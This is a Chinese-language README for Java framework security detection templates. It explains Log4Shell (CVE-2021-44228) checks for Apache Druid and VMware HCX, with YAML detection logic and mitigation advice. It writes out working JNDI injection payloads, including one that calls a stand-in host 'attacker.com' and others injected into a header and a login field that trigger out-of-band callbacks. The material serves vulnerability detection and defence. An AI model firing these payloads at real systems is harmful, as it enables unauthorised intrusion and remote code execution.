# Java 框架安全模板分类说明

本目录聚焦于主流 Java Web 框架及中间件（如 Spring、Struts2、Shiro、Apache Druid 等）的安全风险，涵盖远程代码执行、反序列化、信息泄露等典型漏洞，帮助安全测试人员快速定位和验证相关风险。

---

## 分类说明

- **Spring/Struts2/Shiro**：常见于企业级 Java Web 应用，风险点包括表达式注入、反序列化、权限绕过等。
- **Apache Druid**：大数据分析平台，历史上曾因集成 Log4j 等组件出现严重远程代码执行漏洞。
- **其他 Java 框架**：如 Tomcat、Jetty、Jenkins 等，常见问题为未授权访问、命令执行、配置泄露等。

---

## 典型漏洞模板举例

### Apache Druid Log4j 远程代码执行漏洞（Log4Shell）

**模板文件**：`平台/apache-druid-log4j.yaml`

#### 漏洞简介

Apache Druid 在集成受影响版本的 Log4j 组件时，存在 JNDI 注入导致远程代码执行（Log4Shell，CVE-2021-44228）风险。攻击者可通过构造恶意请求，利用 Log4j 的 JNDI 特性，在目标服务器上执行任意命令。

#### 漏洞原理

Log4j 在处理日志消息时，如果日志内容中包含 `${jndi:ldap://attacker.com/a}` 这样的字符串，会自动发起远程请求并加载恶意类，导致远程代码执行。攻击者只需将 payload 注入到日志参数（如 User-Agent、X-Api-Version 等）即可触发漏洞。

#### 检测逻辑（YAML内容解析）

```yaml
id: apache-druid-log4j

http:
  - method: GET
    path:
      - "{{BaseURL}}/druid/indexer/v1/sampler"
    headers:
      User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "ldap"
```

- 发送带有 JNDI payload 的请求到 Druid 相关接口。
- 通过 OOB（Out-Of-Band）平台（如 interactsh）检测是否有 LDAP 请求回连，判定目标存在该漏洞。

#### 防护建议

- 升级 Apache Druid 及其依赖的 Log4j 组件至官方修复版本。
- 禁用 Log4j 的 JNDI 功能，或限制其加载远程类的能力。
- 对所有用户输入进行严格校验，避免日志记录敏感或可控内容。

---

### VMware HCX Log4j 远程代码执行漏洞（CVE-2021-44228）

**模板文件**：`平台/vmware-hcx-log4j.yaml`

#### 漏洞简介

VMware HCX 集成了受影响版本的 Apache Log4j 组件，存在 JNDI 注入导致远程代码执行（Log4Shell，CVE-2021-44228）风险。攻击者可通过构造恶意请求，在无需认证的情况下远程执行任意命令，获取敏感信息或控制系统。

#### 漏洞原理

Log4j 在处理日志消息时，如果日志内容中包含 `${jndi:ldap://...}` 这样的字符串，会自动发起远程请求并加载恶意类，导致远程代码执行。此模板通过在登录接口的 `username` 字段注入 JNDI payload，若目标存在漏洞，将触发对攻击者控制的服务器的 DNS 或 LDAP 请求。

#### 检测逻辑（YAML内容解析）

```yaml
id: vmware-hcx-log4j

http:
  - raw:
      - |
        @timeout: 10s
        POST /hybridity/api/sessions HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
        Content-Type: application/json
        Origin: {{BaseURL}}

        {
          "authType": "password",
          "username": "${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}",
          "password": "admin"
        }

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
      - type: regex
        part: interactsh_request
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
```

- 发送带有 JNDI payload 的 POST 请求到 `/hybridity/api/sessions`。
- 通过 OOB（如 interactsh）检测是否有 DNS/LDAP 请求回连，判定目标存在该漏洞。

#### 防护建议

- 升级 VMware HCX 及其依赖的 Log4j 组件至官方修复版本。
- 禁用 Log4j 的 JNDI 功能，或限制其加载远程类的能力。
- 对所有用户输入进行严格校验，避免日志记录敏感或可控内容。

---